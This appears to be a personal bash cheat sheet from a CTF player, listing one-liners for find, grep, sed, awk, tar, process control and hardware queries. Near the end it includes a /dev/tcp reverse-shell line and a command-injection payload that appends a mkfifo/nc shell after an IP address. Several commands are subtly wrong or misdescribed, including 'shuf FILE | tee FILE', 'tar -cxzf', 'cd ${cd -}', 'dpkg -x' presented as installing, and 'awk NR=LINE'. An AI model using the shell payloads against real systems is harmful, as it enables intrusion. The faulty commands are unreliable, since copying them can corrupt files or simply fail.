* find all mp3 files in current directory and create a playlist. \; denotes the end of command
```bash
find . -maxdepth 1 -name "*.mp3" -exec echo "play" {} \; > playlist
```

* Shuffles the lines of a file -R = random
```bash
sort -R playlist -o playlist
```

* Shuffles the fast way (ONLY WORKS with file that has run permission)
```bash
shuf FILE | tee FILE
```

* Convert Chinese unreadable filename to correct filename (AWESOME)
```bash
7z x -scs903 ZIPFILE.zip
```

* Find /Search a string in current directory (-w stand for whole word, -r recursive)
```bash
grep -rnw . -e "STRING"
```

* Insert a newline at a specific line with sed -i [--in-place]
```bash
sed -i '$LINE_NUMi \n' foo.txt 
```

* Read all files in a directory line by line
```bash
ls | while read f; do while read -r line; do echo $line; done < $f ; done
```
* Search though a directory recursively with grep, kind of like reading line by line, -i ignore case, -l output filename that match, -L filename that doesn't match
```bash
grep -r --include '*.py' STRING .
```

* Copy an entire directory to another directory
```bash
cp -R source dest
```

* Get the size of a directory with du, disk usage, -s (summary) -h human readable
```bash
du -sh 
```

* Get the size of free space with df, disk free, -h human readable in 1024 power, -H in 1000 power
```bash
df -h 
```

* Get details of a directory -h human readable, -a show hidden, -l print details, -s sort by date
```bash
ls -halt
```

* Find all file with certain extension
```bash
find `pwd` -type f -name "*.txt"
```

* Save the output of a command to a variable
```bash
cwd=$(pwd)
```

* Run a process in the background using & (-c: create a new archive; -x: extract; -z: gunzip; -f : file)
```bash
tar -cxzf file.tar.gz . &
```

* Check current running processes
```bash
jobs
||
ps
```

* Retrieve the first word from stdout
```bash
echo "hello world" | awk '{print $1;}'
||
echo "hello world" | cut -f 1 -d " "
```

* Use nohup to enable a process to continue running in the background when a user exits shell (DETACH FULLY)
```bash
nohup tar -czf file.tar.gz &
```

* Does the above without creating nohup.out 
```bash
nohup COMMAND >/dev/null 2>&1 &
```

* Copy a file content to system clipboard
```bash
xclip -sel clip < FILE
```

* kill a process with ps
```bash
ps -eaf | grep vim
kill 1337
||
kill $(ps | grep play | awk '{print $1;}')
```

* kill a process with pkill (MUCH EASIER :D)
```bash
pkill vim
```

* kill a background process
```bash
jobs
kill %1
```

* Unzip a tarball
```bash
tar xf FILE.tar.xz
```

* Change directory to the output of a command
```bash
cd "$(dirname "$(which FILE)" )"
```

* Change directory to the previous directory!
```bash
cd ${cd -}
||
cd $OLDPWD
```

* Awk with print. echo "Hello World" | awk '{print $1}', prints first field.
```bash
echo "Hello World" | awk '{print $1}'
```

* echo with -e interpretation of back slashes
```bash
echo -e "Hello \n World"
```

* Replace HTTPS with SSH git push
```bash
git remote set-url origin git@github.com:saccharide/google-ctf-2018
```

* Install .deb packages
```bash
dpkg -x file.deb
```

* Install / open .rpm files
```bash
sudo apt install rpm2cpio
rpm2cpio /path-to-file.rpm | cpio -i --make-directories
```

* Clear from cursor to the beginning of a line
```bash
CTRL + u
```

* Clear from cursor to the end of a line
```bash
CTRL + k
```

* Clears one character to the right of cursor 
```bash
CTRL + d
```

* Clears one word to the left of the cursor
```bash
ESC + Backspace
```

* Clears one word to the right of the cursor
```bash
ESC + d
```
* Cut (returns Hello) -d = deliminator, -f = field (fields are numbered from 1)
```bash
echo "Hello World" | cut -d ' ' -f 1
```

* grep exclude a file of strings
```bash
grep -avf "FILE.txt"
```

* Xargs usage, useful pipes, but require the flag -print0, -I: replaces occurrence of replace-str in the initial arguments with names read from std in
```bash
find . -type f -name "*.mp3" -print0 | xargs -0 -I file cp file dir/
||
ls | grep mp3 | xargs -I file cp file dir/
ls | grep -avf "BLACKLIST" | xargs -I file COMMANDS file
```

* 7z is officially weird... the arguments it take have to be right afterwards...
```bash
7z x ZIP.zip -oEXTRACTED
```

* tr. It translates and/or deletes chars from stdin input, and writes to stdout. -d: deletes all occurrence, -s: make repeated sequential characters only appear once
```bash
tr [a-z] [A-Z] < lowercase.txt > uppercase.txt
cat file.txt | tr -d ' '
cat file.txt | tr -s '.'
```

* grip. Using grip to build markdown files locally. -b: opens up a browser tab.
```bash
grip -b FILE.md
```

* cut with tabs ... there is an easy way... cut by default split by tabs...
```bash
cat FILE | cut -d $'\t' -f 2
||
cat FILE | cut -f 2
```

* Reading certain types of file line by line with find
```bash
for file in $(find . -type f -name "*.txt")
do
cat $file
done
```

* Redirection
```bash
ls DIR > dirlist
">" Redirects output
">>" Appends output to an existing file
"<" Takes in input
">&" Redirects output of one file to another, e.g. "2>&1" redirects error to output (pre bash 4.0)
"&>>" does the above in post Bash 4.0 and apending it to a file
"&>" does the above but overwrites the target file
``` 

* nmap -A: Aggressive mode
```bash
nmap -A IP
```

* Check architecture
```bash
dpkg --print-architecture
```

* Interactive bash shell
```bash
/bin/bash -i > /dev/tcp/IP/PORT 0<&1 2>&1
```
* Check OS version
```bash
lsb_release -a
```
* Another way to get reverse shell with command execution
```bash
192.168.0.18; rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1  | nc -lp 9999 > /tmp/f
```

* Print out the content of a file at LINE number (-n in sed is quiet), p = print
```bash
awk 'NR=LINE{print}' FILE
sed -n -e LINEp FILE
sed -n LINEp FILE
sed -n 'LINE{p;q}' FILE
```

* Print out a range of line of a file
```bash
sed -n -e '100,110 p' FILE
sed -n 100,110p FILE
```

* Output the first X line of a file
```bash
sed 'X{p;q}' FILE
head -n X FILE
```

* Getting the current directory name in a cool way, it can be VERY USEFUL!
```bash
basename $PWD
```

* List all the graphics card, `-nn` Show PCI vendor and device codes, `-v` verbose.
```bash
lspci -vnn | grep VGA -A 12
```
* AWESOME grep FLAG, `-A NUM`, print NUM lines of trailing context after matching line
```bash
grep VGA -A 12
```

* Show CPU info
```bash
lscpu
```
* Show USB info, to determine the version of USB a flash drive is using, `-D` list devices.
```bash
lsusb
lsusb -D /dev/bus/usb/003/023
```

